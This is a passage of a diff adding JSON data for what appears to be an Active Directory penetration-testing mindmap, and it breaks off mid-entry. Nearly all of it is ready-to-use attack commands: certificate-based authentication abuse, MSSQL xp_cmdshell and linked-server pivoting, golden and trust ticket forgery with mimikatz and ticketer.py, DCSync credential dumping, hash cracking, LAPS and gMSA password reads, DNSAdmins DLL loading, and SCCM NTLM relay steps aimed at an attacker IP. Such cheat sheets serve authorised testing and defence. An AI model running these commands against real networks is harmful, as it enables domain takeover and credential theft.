+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "pkinit",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "gettgtpkinit.py -cert-pfx \"<pfx_file>\" ^[-pfx-pass  \"<cert-password>\"] \"<fqdn_domain>/<user>\" \"<tgt_ccache_file>\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "Rubeus.exe asktgt /user:\"<username>\" /certificate:\"<pfx_file>\" [/password:\"<certificate_password>\"] /domain:\"<fqdn-domain>\" /dc:\"<dc>\" /show",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy auth -pfx <crt_file> -dc-ip <dc_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "schannel",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy auth -pfx <pfx_file> -ldap-shell",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "add_computer",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": false,
+       "t": "Set RBCD",
+       "cve": false,
+       "flow": "RBCD"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy cert -pfx \"<pfx_file>\" -nokey -out \"user.crt\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "certipy cert -pfx \"<pfx_file>\" -nocert -out \"user.key\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": true,
+       "t": "passthecert.py -action ldap-shell -crt <user.crt> -key <user.key> -domain <domain> -dc-ip <dc_ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "MSSQL",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "find mssql access",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc mssql <ip> -u <user> -p <password> -d <domain>`",
+       "cve": false,
+       "flow": "MSSQL"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Users or Computers with SQL admin",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p`",
+       "cve": false,
+       "flow": "MSSQL"
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "enum_db",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "enable_xp_cmdshell",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "xp_cmdshell <cmd>`",
+       "cve": false,
+       "flow": "Low Access"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "enum_impersonate",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "exec_as_user <user>`",
+       "cve": false,
+       "flow": "MSSQL"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "exec_as_login <login>`",
+       "cve": false,
+       "flow": "MSSQL"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "xp_dir_tree <ip>`",
+       "cve": false,
+       "flow": "COERCE SMB"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "trustlink",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "sp_linkedservers",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "use_link`",
+       "cve": false,
+       "flow": "MSSQL || Trust"
+      }
+     ]
+    }
+   ]
+  },
+  "trusts": {
+   "title": "Trusts",
+   "subjects": [
+    {
+     "title": "Enumeration",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nltest.exe /trusted_domains",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "Get-DomainTrust -Domain <domain>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "Get-DomainTrustMapping",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trusts",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "sharphound.exe -c trusts -d <domain>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Get Domains SID",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Get-DomainSID -Domain <domain> Get-DomainSID -Domain <target_domain>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "lookupsid.py -domain-sids <domain>/<user>:<password>'@<dc> 0 lookupsid.py -domain-sids <domain>/<user>:<password>'@<target_dc> 0",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Child->Parent",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Trust Key",
+       "cve": false,
+       "flow": "PassTheTicket"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "mimikatz lsadump::trust /patch",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "secretsdump.py -just-dc-user '<parent_domain>$'   <domain>/<user>:<password>@<dc_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Golden Ticket",
+       "cve": false,
+       "flow": "PassTheTicket"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "raiseChild.py <child_domain>/<user>:<password>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Unconstrained delegation",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "coerce parent_dc on child_dc domain",
+       "cve": false,
+       "flow": "unconstrained delegation"
+      }
+     ]
+    },
+    {
+     "title": "Parent->Child",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "same as Child to parent",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "External Trust",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "DomainA <--> DomainB trust (B trust A, A trust B)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "from A to B FOREST_TRANSITIVE",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "password reuse",
+       "cve": false,
+       "flow": "lat move (creds/pth/...)"
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Foreign group and users",
+       "cve": false,
+       "flow": "ACL"
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "Users with foreign Domain Group Membership",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": true,
+       "t": "MATCH p=(n:User {domain:\"<DOMAIN.FQDN>\"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "Group with foreign Domain Group Membership",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": true,
+       "t": "MATCH p=(n:Group {domain:\"<DOMAIN.FQDN>\"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "SID History on B",
+       "cve": false,
+       "flow": "PassTheTicket"
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "Golden ticket",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": true,
+       "t": "mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 5,
+       "cmd": true,
+       "t": "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": true,
+       "t": "ticketer.py -nthash <krbtgt> -domain-sid <domain_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> fakeuser",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "Trust ticket",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": true,
+       "t": "secretsdump.py -just-dc-user '<domainB>' <domainA>/<user>:'<password>'@<dc_a>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 5,
+       "cmd": true,
+       "t": "ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "ADCS abuse",
+       "cve": false,
+       "flow": "ADCS"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "Unconstrained delegation",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": false,
+       "t": "coerce dc_b on dc_a",
+       "cve": false,
+       "flow": "unconstrained delegation"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "DomainA <-- DomainB trust (B trust A / A access B)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Same as double trust, but no unconstrained delegation as B can't connect to A",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "DomainA --> DomainB trust (A trust B / B access A)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "password reuse",
+       "cve": false,
+       "flow": "lat move (creds/pth/...)"
+      }
+     ]
+    },
+    {
+     "title": "Mssql links",
+     "flows": [
+      [
+       "MSSQL"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "MSSQL trusted links doesn't care of trust link",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "trustlink",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "sp_linkedservers",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": false,
+       "t": "use_link",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "authors": {
+   "title": "authors",
+   "subjects": [],
+   "missing": true
+  },
+  "crack_hash": {
+   "title": "Crack hash",
+   "subjects": [
+    {
+     "title": "LM (299bd128c1101fd6)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "john --format=lm hash.txt --wordlist=<rockyou.txt>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "hashcat -m 3000 -a 0 hash.txt <rockyou.txt>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "NT (b4b9b02e6f09a9bd760...)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "john --format=nt hash.txt --wordlist=<rockyou.txt>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "NTLMv1 (user::85D5BC...)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "john --format=netntlm hash.txt --wordlist=<rockyou.txt>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "crack.sh",
+       "cve": false,
+       "flow": null,
+       "link": "[https://crack.sh/](https://crack.sh/)"
+      }
+     ]
+    },
+    {
+     "title": "NTLMv2 (user::N46iSNek...)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "john --format=netntlmv2 hash.txt --wordlist=<rockyou.txt>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "hashcat -m 5600 -a 0 hash.txt <rockyou.txt>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Kerberos 5 TGS ($krb5tgs$23$...)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "john --format=krb5tgs hash.txt --wordlist=<rockyou.txt>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "hashcat -m 13100 -a 0 hash.txt <rockyou.txt>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Kerberos 5 TGS AES128 ($krb5tgs$17...)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "hashcat -m 19600 -a 0 hash.txt <rockyou.txt>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Kerberos ASREP ($krb5asrep$23...)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "hashcat -m 18200 -a 0 hash.txt <rockyou.txt>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "MSCache 2 (very slow) ($DCC2$10240...)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "hashcat -m 2100 -a 0 hash.txt <rockyou.txt>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Timeroast hash ($sntp-ms$...)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "pxe hash ($sccm$aes128$...)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "hashcat -m 19850 -a 0 hash.txt <rockyou.txt>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "acl": {
+   "title": "ACLs/ACEs permissions",
+   "subjects": [
+    {
+     "title": "Dcsync",
+     "flows": [
+      [
+       "Domain Admin",
+       "Lateral move",
+       "Crack hash"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>'",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "can change msDS-KeyCredentialLInk (Generic Write) + ADCS",
+     "flows": [
+      [
+       "PassTheCertificate"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Shadow Credentials",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\"",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "On Group",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "GenericAll/GenericWrite/Self/Add Extended Rights",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Add member to the group",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Write Owner",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Grant Ownership",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "WriteDACL + WriteOwner",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Grant rights",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Give yourself generic all",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "On Computer",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "GenericAll / GenericWrite",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "msDs-AllowedToActOnBehalf",
+       "cve": false,
+       "flow": "RBCD"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "add Key Credentials",
+       "cve": false,
+       "flow": "shadow credentials"
+      }
+     ]
+    },
+    {
+     "title": "On User",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "GenericAll / GenericWrite",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Change password",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "net user <user> <password> /domain`",
+       "cve": false,
+       "flow": "User with clear text pass"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "add SPN (target kerberoasting)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "targetedKerberoast.py -d <domain> -u <user> -p <pass>`",
+       "cve": false,
+       "flow": "Hash found (TGS)"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "add key credentials",
+       "cve": false,
+       "flow": "shadow credentials"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "login script",
+       "cve": false,
+       "flow": "Access"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ForceChangePassword",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "net user <user> <password> /domain`",
+       "cve": false,
+       "flow": "User with clear text pass"
+      }
+     ]
+    },
+    {
+     "title": "On OU",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Write Dacl",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "ACE Inheritance",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Grant rights",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "GenericAll / GenericWrite / Manage Group Policy Links",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "OUned.py --config config.ini",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "ReadGMSAPassword",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc ldap <ip> -u <user> -p <pass> --gmsa",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Get LAPS passwords",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Who can read LAPS",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Read LAPS",
+       "cve": false,
+       "flow": "Admin"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\\<login> | Format-Table -AutoSize",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "msf> use post/windows/gather/credentials/enum_laps",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "GPO",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Who can control GPOs",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "SID of principals that can create new GPOs in the domain",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=blah,DC=com\" -ResolveGUIDs  | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Return the principals that can write to the GP-Link attribute on OUs",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Generic Write on  GPO",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Abuse GPO",
+       "cve": false,
+       "flow": "ACCESS"
+      }
+     ]
+    },
+    {
+     "title": "DNS Admin",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "DNSadmins abuse (CVE-2021-40469)",
+       "cve": true,
+       "flow": "Admin"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "dnscmd.exe /config /serverlevelplugindll <\\\\path\\to\\dll> # need a dnsadmin user",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "sc \\\\DNSServer stop dns sc \\\\DNSServer start dns",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "sccm": {
+   "title": "SCCM",
+   "subjects": [
+    {
+     "title": "recon",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "sccmhunter.py show -all",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc smb <sccm_server> -u <user> -p <password> -d <domain> --shares",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Creds-1 No credentials",
+     "flows": [
+      [
+       "NAA credentials",
+       "User + Pass"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Extract from pxe See no creds",
+       "cve": false,
+       "flow": "PXE"
+      }
+     ]
+    },
+    {
+     "title": "Elevate-1:Relay on site systems Simple user",
+     "flows": [
+      [
+       "Admin on Site system"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "coerce sccm site server",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "ntlmrelayx.py -tf <site_systems> -smb2support",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Elevate-2:Force client push Simple user",
+     "flows": [
+      [
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ntlmrelayx.py -t <sccm_server> -smb2support -socks # listen connection",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip> # Launch client push install",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "cleanup",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Elevate-3:Automatic client push Simple user",
+     "flows": [
+      [
+       "Relay ntlm"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Create DNS A record for non existing computer x",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "dnstool.py -u '<domain>\\<user>' -p <pass>  -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Enroll new computer x in AD  then remove host SPN from the machine account",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "setspn -D host/<newcomputer> <newcomputer> setspn -D host/<newcomputer>.<domain> <newcomputer>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": false,
+       "t": "wait 5m for client push",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 5,
+       "cmd": true,
+       "t": "ntlmrelayx.py -tf <no_signing_target> -smb2support -socks",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 6,
+       "cmd": false,
+       "t": "cleanup",
